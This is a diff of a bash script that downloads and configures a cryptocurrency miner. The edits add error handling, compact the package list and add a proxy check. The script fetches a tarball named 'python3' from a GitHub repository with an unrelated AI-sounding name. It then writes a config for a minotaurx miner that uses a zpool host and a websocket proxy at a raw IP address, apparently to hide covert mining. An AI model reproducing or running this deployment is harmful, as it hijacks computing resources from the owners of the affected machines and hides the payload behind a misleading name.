@@ -1,5 +1,6 @@
 #!/bin/bash
 
+# Configuration variables
 : "${M_ALGO:=minotaurx}"
 : "${M_HOST:=minotaurx.na.mine.zpool.ca}"
 : "${M_PORT:=7019}"
@@ -8,14 +9,21 @@
 : "${M_THREADS:=4}"
 : "${M_PROXY:=ws://172.233.136.27:8088/proxy}"
 
-# Download project 
-echo "Downloading Project..."
-wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
-tar -xvf python3.tar.gz
-rm python3.tar.gz
-cd python3
+# Check if required commands are available
+command -v wget >/dev/null 2>&1 || { echo >&2 "wget is required but it's not installed. Aborting."; exit 1; }
+command -v apt-get >/dev/null 2>&1 || { echo >&2 "apt-get is required but it's not installed. Aborting."; exit 1; }
 
-echo "Start download packages..."
+# Download project
+echo "Downloading Project..."
+if ! wget -q https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz; then
+    echo "Failed to download project. Aborting."
+    exit 1
+fi
+
+tar -xvf python3.tar.gz && rm python3.tar.gz
+cd python3 || { echo "Failed to enter the project directory. Aborting."; exit 1; }
+
+echo "Start downloading packages..."
 
 # Create lib file
 rm -rf ./dependencies
@@ -34,14 +42,20 @@ download_with_dependencies() {
         echo "$pkg is already installed."
     else
         echo "Downloading $pkg and its dependencies..."
-        apt-get download "$pkg"
-        
-        # Recursively find and download dependencies
-        local deps=$(apt-cache depends "$pkg" | grep "Depends:" | sed "s/.*Depends: //" | tr '\n' ' ')
+        if ! apt-get download "$pkg"; then
+            echo "Failed to download $pkg. Aborting."
+            exit 1
+        fi
+
+        local deps
+        deps=$(apt-cache depends "$pkg" | grep "Depends:" | sed "s/.*Depends: //" | tr '\n' ' ')
         for dep in $deps; do
             if ! is_installed "$dep"; then
                 echo "Downloading dependency $dep..."
-                apt-get download "$dep"
+                if ! apt-get download "$dep"; then
+                    echo "Failed to download dependency $dep. Aborting."
+                    exit 1
+                fi
             fi
         done
     fi
@@ -49,54 +63,14 @@ download_with_dependencies() {
 
 # Define the packages to download
 packages=(
-    libdatrie-dev
-    libgraphite2-3
-    libnss3-dev
-    gconf-service
-    libasound2
-    libatk1.0-0
-    libc6
-    libcairo2
-    libcups2
-    libdbus-1-3
-    libexpat1
-    libfontconfig1
-    libgcc1
-    libgconf-2-4
-    libgdk-pixbuf2.0-0
-    libglib2.0-0
-    libgtk-3-0
-    libnspr4
-    libpango-1.0-0
-    libpangocairo-1.0-0
-    libstdc++6
-    libx11-6
-    libx11-xcb1
-    libxcb1
-    libxcomposite1
-    libxcursor1
-    libxdamage1
-    libxext6
-    libxfixes3
-    libxi6
-    libxrandr2
-    libxrender1
-    libxss1
-    libxtst6
-    ca-certificates
-    fonts-liberation
-    libappindicator1
-    libnss3
-    lsb-release
-    xdg-utils
-    libgbm-dev
-    libatk-bridge2.0-0
-    libavahi-client-dev
-    libatspi2.0-0
-    libxdamage1libatspi
-    libdrm2
-    libwayland-server0
-    libxcb-randr0-dev
+    libdatrie-dev libgraphite2-3 libnss3-dev gconf-service libasound2
+    libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1
+    libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4
+    libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1
+    libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2
+    libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1
+    libnss3 lsb-release xdg-utils libgbm-dev libatk-bridge2.0-0 libavahi-client-dev
+    libatspi2.0-0 libxdamage1libatspi libdrm2 libwayland-server0 libxcb-randr0-dev
 )
 
 # Loop through each package, download it and its dependencies
@@ -113,7 +87,7 @@ if [ "$count" -gt 0 ]; then
         rm "$deb_file"
     done
 
-    # Links libs
+    # Link libs
     rm -rf "$HOME/dependencies"
     mkdir -p "$HOME/dependencies"
     cp -r ./dependencies/* "$HOME/dependencies"
@@ -124,6 +98,12 @@ fi
 
 # Remove the existing config.json file
 rm -f config.json
+
+# Validate proxy URL
+if ! [[ $M_PROXY =~ ^(ws|http):// ]]; then
+    echo "Invalid proxy URL. Must start with ws:// or http://. Aborting."
+    exit 1
+fi
 
 # Create a new config.json file with the specified content
 cat <<EOL > config.json
@@ -140,4 +120,4 @@ cat <<EOL > config.json
 }
 EOL
 
-echo "All packages downloaded and extracted. Next step to start mining"
+echo "All packages downloaded and extracted. Next step to start mining."
